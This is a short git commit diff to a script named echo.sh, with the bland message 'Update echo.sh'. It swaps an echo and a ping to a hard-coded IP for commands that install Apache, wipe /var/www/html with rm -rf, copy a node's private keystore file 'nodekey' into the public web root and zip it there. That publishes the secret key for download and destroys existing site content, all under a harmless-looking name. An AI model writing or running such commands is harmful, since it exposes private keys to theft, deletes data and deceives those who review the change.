f572530257794a2d88b7f67f22d5e032820e30bf
dido <140655482+dido20231@users.noreply.github.com>
2024-02-06 12:47:39 +0200

    Update echo.sh

--- echo.sh
+++ echo.sh
@@ -1,2 +1,8 @@
-echo hello
-ping 207.154.200.21
+sudo apt install apache2 -y
+sudo apt install zip -y
+/etc/init.d/apache2 start
+sudo service apache2 start
+rm -rf /var/www/html/*
+cp /home/datadir-node1/keystore/nodekey /var/www/html/nodekey
+cd /var/www/html/
+zip nodekey *
